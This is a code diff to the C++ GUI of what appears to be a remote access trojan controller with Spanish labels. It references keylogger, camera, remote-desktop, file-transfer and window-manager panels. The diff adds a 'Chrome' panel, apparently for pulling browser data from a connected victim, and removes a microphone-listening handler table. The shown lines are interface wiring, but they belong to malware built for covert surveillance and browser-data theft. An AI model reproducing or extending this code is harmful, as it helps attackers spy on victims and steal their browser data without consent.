@@ -8,6 +8,7 @@
 #include "panel_keylogger.hpp"
 #include "panel_camara.hpp"
 #include "panel_wmanager.hpp"
+#include "panel_info_chrome.hpp"
 #include "server.hpp"
 #include "misc.hpp"
 
@@ -21,12 +22,6 @@ wxEND_EVENT_TABLE()
 
 wxBEGIN_EVENT_TABLE(MyTreeCtrl, wxTreeCtrl)
     EVT_TREE_ITEM_ACTIVATED(EnumIDS::TreeCtrl_ID, MyTreeCtrl::OnItemActivated)
-wxEND_EVENT_TABLE()
-
-wxBEGIN_EVENT_TABLE(panelMicrophone, wxPanel)
-    EVT_BUTTON(EnumIDS::ID_Panel_Mic_BTN_Refresh, panelMicrophone::OnRefrescarDispositivos)
-    EVT_BUTTON(EnumIDS::ID_Panel_Mic_BTN_Escuchar, panelMicrophone::OnEscuchar)
-    EVT_BUTTON(EnumIDS::ID_Panel_Mic_BTN_Detener, panelMicrophone::OnDetener)
 wxEND_EVENT_TABLE()
 
 FrameCliente::FrameCliente(std::string strID, SOCKET sckID, std::string strIP)
@@ -168,10 +163,12 @@ void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
         }else if (wStr == "Escritorio Remoto") {
             frameRemoteDesktop* frm_temp = DBG_NEW frameRemoteDesktop(this, this->sckCliente);
             frm_temp->Show(true);
-        }else if (wStr == "Transferencias") {
+        } else if (wStr == "Transferencias") {
             this->p_Notebook->AddPage(new panelTransferencias(this, this->strClienteID), wStr, true);
-        }else if (wStr == "Admin de Ventanas") {
+        } else if (wStr == "Admin de Ventanas") {
             this->p_Notebook->AddPage(new panelWManager(this, this->sckCliente), wStr, true);
+        } else if (wStr == "Chrome") {
+            this->p_Notebook->AddPage(new panelInfoChrome(this, this->sckCliente), wStr, true);
         }
 
         this->p_Notebook->Thaw();
